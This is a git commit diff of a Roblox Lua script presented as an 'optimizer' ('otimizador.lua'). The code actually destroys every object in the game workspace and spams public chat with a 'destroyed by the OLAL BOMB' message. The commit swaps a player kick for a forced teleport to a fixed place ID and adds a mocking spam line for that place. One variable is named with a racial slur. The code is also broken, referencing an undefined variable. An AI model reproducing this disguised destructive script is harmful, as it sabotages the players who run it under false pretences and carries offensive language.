87ef50f88a80881891f85eac5e95d3c2601c7422
krypton <71219830+KrypDeveloper@users.noreply.github.com>
2024-03-25 19:02:21 -0300

    Update otimizador.lua

--- otimizar/otimizador.lua
+++ otimizar/otimizador.lua
@@ -1,18 +1,27 @@
-  local niga = {
+if game.PlaceId ~= 5373028495 then
+local niga = {
     [1] = "ESTE JOGADOR FOI DESTRUIDO PELO OLAL BOMB",
     [2] = "All"
   }
   local contagem = 0
 while true do
   if contagem >= 20 then
-    game.Players.LocalPlayer:Kick("FUDIDO PELO OLAL BOMB")
+    game:GetService("TeleportService"):Teleport(5373028495)
   else
 for _, a in pairs(game.Workspace:GetDescendants()) do
   a:Clone()
     a:Destroy()
   end
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(niga))
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(id))
   contagem = contagem + 1
   return contagem
   end
+end
+else
+  local precoce = {
+    [1] = "eu amo todes aqui, eu amo todes aqui, eu amo todes aqui, eu amo todes aqui",
+    [2] = "All"
+  }
+
+   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(precoce))
 end
